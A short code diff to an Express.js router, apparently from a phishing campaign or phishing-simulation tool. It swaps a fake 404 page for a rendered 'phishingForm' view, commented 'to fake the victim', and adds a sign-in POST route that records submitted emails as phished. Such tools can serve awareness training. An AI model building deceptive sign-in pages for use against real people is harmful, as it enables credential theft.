@@ -6,10 +6,17 @@ const router = Router();
 /***
  * This route responsible to update the victim's phishing status
  */
-router.get('/userInfo/:mail', async (req, res) => {
-    const { mail } = req.params;
+
+
+router.get('/userInfo/', (req, res) => {
+    // const { mail } = req.auth;
+    res.render('phishingForm'); // to fake the victim
+})
+
+router.post('/signInForm', async (req, res) => {
+    const { mail } = req.body;
     await PhishingVictim.findOneAndUpdate({ mail }, { status: true });
-    res.send('<b>404 Page not found</b>'); // to fake the victim
+    res.status(200).send({ message: "email saved!" });
 })
 
 
